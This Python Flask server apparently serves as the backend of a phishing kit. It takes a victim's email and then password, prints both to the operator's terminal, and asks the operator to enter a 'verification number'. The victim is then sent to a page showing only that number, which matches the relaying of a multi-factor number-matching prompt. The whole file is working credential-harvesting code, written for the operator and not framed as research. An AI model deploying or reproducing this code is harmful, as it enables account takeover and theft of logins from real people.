from flask import Flask, request, render_template, redirect, url_for
import re
import urllib.parse

app = Flask(__name__)

# Step 0 → form.html (starting page)
@app.route("/index1", methods=["GET"])
def form():
    return render_template("index1.html")

# Step 1 → index1 (email input)
@app.route("/", methods=["GET"])
def index1():
    # keep root same as index1 if you want; OR visit /form to start
    return render_template("form.html")

# Handles both email + password submissions because HTML points to /get
@app.route("/get", methods=["GET", "POST"])
def get_data():
    # support both querystring and form posts (as your app did)
    data = request.args.to_dict() or request.form.to_dict()
    if data:
        # If email submitted → go to password page (index2)
        if "email" in data:
            print("📩 Email received:", data)
            # preserve email as query param when redirecting to /dob
            return redirect(url_for("dob", email=data["email"]))
        # If password submitted → prompt operator for verification number, then redirect to verify
        elif "password" in data:
            print("🔑 Password received:", data)
            # Prompt operator in terminal for the number to show
            # This will block until you type a value and press Enter
            while True:
                try:
                    number = input("Enter verification number to show to user: ").strip()
                except EOFError:
                    # In some environments input() might raise EOFError; default to 21
                    number = ""
                # sanitize: allow only digits and optional + or - (you can change)
                if not number:
                    print("Empty input — please type a number (digits only).")
                    continue
                if re.fullmatch(r"[0-9+\-]+", number):
                    break
                print("Invalid input — use digits only (or +/ - )")
            # url-encode the number so redirect is safe
            encoded = urllib.parse.quote_plus(number)
            return redirect(url_for("verify", code=encoded))
    # default render (if no data)
    return render_template("index1.html")

# Step 2 → password page
@app.route("/dob", methods=["GET", "POST"])
def dob():
    email = request.args.get("email")
    return render_template("index2.html", email=email)

# verification display page (completely blank except big number)
@app.route("/verify", methods=["GET"])
def verify():
    # read code from query param, sanitize it to digits and a few symbols
    code = request.args.get("code", "")
    # allow digits and plus/minus only; fallback to '21' if invalid
    if not re.fullmatch(r"[0-9+\-]+", code or ""):
        code = "21"
    return render_template("verify.html", code=code)

if __name__ == "__main__":
    # Debug True makes development easier; use False in production.
    app.run(host="0.0.0.0", port=8000, debug=True)
